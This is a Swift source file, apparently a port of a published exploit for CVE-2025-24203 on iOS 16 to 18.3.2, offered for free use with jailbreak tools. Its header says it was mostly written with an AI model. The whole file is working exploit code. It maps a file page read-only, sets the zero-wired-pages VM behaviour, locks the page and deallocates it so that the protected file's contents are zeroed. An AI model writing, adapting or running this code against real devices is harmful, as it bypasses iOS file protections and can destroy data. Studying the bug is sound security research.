// SwiftZero Exploit by GeoSn0w (https://twitter.com/FCE365)
// Developed for tools on https://idevicecentral.com but feel free to use freely.
// This is a Swift port of the exploit for CVE-2025-24203 for iOS 16.0 - 18.3.2 from https://project-zero.issues.chromium.org/issues/391518636
// CVE-2025-24203 discovered by Ian Beer of Google Project Zero.
// Mostly made with Claude and based on Skadz' version

import Foundation
import Darwin
import MachO

let pageSize = Int(sysconf(_SC_PAGESIZE))

func mapFilePage(path: String) throws -> UnsafeMutableRawPointer {
    let fd = open(path, O_RDONLY)
    
    guard fd != -1 else {
        throw "Open failed: Could not access the file at \(path)"
    }
    
    let mappedAt = mmap(nil, pageSize, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0)
    
    guard mappedAt != MAP_FAILED else {
        close(fd)
        throw "MMAP failed: Could not map the file to memory"
    }
    
    close(fd)
    return mappedAt!
}

func runCVEForPaths(path: String) throws {
    print("🔒 CVE-2025-24203 Exploit - Starting for file: \(path)")
    
    let page = try mapFilePage(path: path)
    
    let pageAddress = Int(bitPattern: page)
    print("📍 File successfully mapped to memory at address: 0x\(String(format: "%016x", pageAddress))")
    
    let pageVmAddress = vm_address_t(UInt(bitPattern: page))
    print("⚙️ Setting VM behavior flag VM_BEHAVIOR_ZERO_WIRED_PAGES...")
    
    var kernReturn = vm_behavior_set(mach_task_self_,
                                     pageVmAddress,
                                     vm_size_t(pageSize),
                                     VM_BEHAVIOR_ZERO_WIRED_PAGES)
    
    guard kernReturn == KERN_SUCCESS else {
        throw "VM behavior set failed: Could not set VM_BEHAVIOR_ZERO_WIRED_PAGES on the memory region"
    }
    
    print("✅ VM behavior flag successfully set")
    
    print("🔐 Locking memory with mlock()...")
    let mlockErr = mlock(page, pageSize)
    guard mlockErr == 0 else {
        throw "Memory lock failed: Could not lock the mapped memory (errno: \(errno))"
    }
    print("✅ Memory successfully locked")
    
    print("💥 Triggering exploit: Deallocating VM entries while memory is still wired...")
    kernReturn = vm_deallocate(mach_task_self_,
                               pageVmAddress,
                               vm_size_t(pageSize))
    
    guard kernReturn == KERN_SUCCESS else {
        throw "VM deallocate failed: \(String(cString: mach_error_string(kernReturn)))"
    }
    print("✅ VM entries successfully deallocated")
    
    print("🎉 Exploit successfully completed! File content has been zeroed.")
}
